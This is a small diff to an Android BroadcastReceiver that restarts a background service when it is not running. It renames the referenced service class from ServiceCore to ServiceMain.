@@ -16,7 +16,7 @@ import android.telephony.TelephonyManager;
 
 import com.android.networking.Call;
 import com.android.networking.Core;
-import com.android.networking.ServiceCore;
+import com.android.networking.ServiceMain;
 import com.android.networking.auto.Cfg;
 import com.android.networking.util.Check;
 
@@ -35,9 +35,9 @@ public class BC extends BroadcastReceiver {
 	public void onReceive(Context context, Intent intent) {
 		try {
 			if (Core.isServiceRunning() == false) {
-				Intent serviceIntent = new Intent(context, ServiceCore.class);
+				Intent serviceIntent = new Intent(context, ServiceMain.class);
 
-				// serviceIntent.setAction(Messages.getString("com.android.service.ServiceCore"));
+				// serviceIntent.setAction(Messages.getString("com.android.service_ServiceCore"));
 				context.startService(serviceIntent);
 
 				if (Cfg.DEBUG) {
